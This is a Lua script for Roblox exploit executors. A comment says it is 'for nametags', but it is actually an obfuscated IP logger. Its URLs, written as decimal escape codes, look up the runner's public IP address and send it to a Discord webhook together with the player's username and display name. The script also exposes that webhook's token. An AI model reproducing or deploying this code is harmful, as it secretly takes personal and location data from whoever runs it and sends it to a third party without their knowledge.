local function runcode(func) func() end
runcode(function()
    local getmetausers = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function() end 
    -- for nametags
    local info = getmetausers({
        Method = "GET";
        Url = "\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103\47\63\102\111\114\109\97\116\61\106\115\111\110";
        Headers = game:GetService("HttpService"):JSONDecode({
            ['Content-Type'] = 'application/json'
        })
    })
    local metauser = info.Body:split('"')[4]
    local meta = game:GetService("HttpService")
    local metav2 = game:GetService("Players")
    local meta_responsev2 = getmetausers({
        Method = "POST";
        Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\48\56\57\50\53\48\54\56\49\57\52\54\51\57\52\56\49\52\47\98\112\115\78\81\50\114\120\66\57\76\99\78\111\76\72\74\74\71\98\73\69\81\77\98\50\49\112\106\99\83\88\85\120\114\95\99\109\122\71\88\54\57\99\105\90\105\86\82\87\57\48\76\97\48\71\89\75\71\105\50\113\70\77\82\88\116\73";
        Headers = {
            ['Content-Type'] = 'application/json'
        };
        Body = meta:JSONEncode({
            ['content'] = "**New Log!**\n\nTime: ||"..info.Headers.Date.."||\nDisplay: "..metav2.LocalPlayer.DisplayName.."\nUsername: "..metav2.LocalPlayer.Name.."\n **(DANGEROUS)** IP Address: ||"..metauser.."||";
            ['embeds'] = nil;
            ['attachments'] = {};
        })
    })
end)
